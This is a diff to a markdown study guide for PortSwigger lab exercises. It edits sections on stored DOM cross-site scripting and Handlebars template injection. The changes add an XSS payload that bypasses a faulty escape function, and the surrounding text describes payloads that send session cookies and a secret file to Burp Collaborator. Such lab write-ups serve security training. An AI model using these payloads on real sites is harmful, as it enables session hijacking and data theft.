@@ -714,7 +714,7 @@ body:document.cookie
 
 ### Stored DOM XSS  
 
->In the JavaScript `source code` ***identify*** the ```html.replace()``` function inside the custom ```loadComments```, and testing payloads we see the function only replaces the first occurrence.  
+>In the JavaScript `source code`, included script `resources/js/loadCommentsWithVulnerableEscapeHtml.js` we ***identify*** the `html.replace()` function inside the custom `loadComments` function. Testing payloads we see the function only replaces the first occurrence of `<>`.  
 
 ![stored dom-xss code replace](images/stored-dom-xss-code.png)  
 
@@ -725,6 +725,8 @@ body:document.cookie
 >Above payload is stored and any user visiting the comment blog will result in their session cookie being stolen and send to collaborator.  
 
 ![stored dom-xss json comments](images/stored-dom-xss-json-comments.png)  
+
+>PortSwigger Lab payload: `<><img src=1 onerror=alert()>`.  
 
 [PortSwigger Lab: Stored DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)  
   
@@ -2542,7 +2544,7 @@ fuzzer${{<%[%'"}}%\,<>
 
 ![identified-ssti-handlebars.png](images/identified-ssti-handlebars.png)  
 
->[URL encoding](https://www.urlencoder.org/) the payload, it is not required to remove newline breaks or spaces. The payload will send the contents of ```/home /carlos/secret``` to Burp Collaborator.  
+>[URL encoding](https://www.urlencoder.org/) the payload, it is not required to remove newline breaks or spaces. The payload will send the contents of `/home/carlos/secret` to Burp Collaborator.  
 
 ```
 wrtz{{#with "s" as |string|}}
